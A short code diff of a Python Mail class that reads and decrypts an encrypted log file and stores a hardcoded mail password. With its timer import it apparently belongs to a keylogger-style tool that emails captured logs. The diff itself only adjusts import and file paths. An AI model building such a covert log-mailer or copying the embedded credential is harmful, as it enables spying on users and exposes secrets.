@@ -4,7 +4,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from threading import Timer
 
-from crypt import Crypt
+from .crypt import Crypt
 
 
 class Mail:
@@ -15,7 +15,7 @@ class Mail:
     PASSWORD = "zQ@o7L5J4@AwWN7AK#"
 
     def get_text(self):
-        with open("log.txt", "rb") as enc_file:
+        with open("files/log.txt", "rb") as enc_file:
             encrypted_log_byte = enc_file.read()
 
         decrypted_log_byte = Crypt().decrypt(encrypted_log_byte)
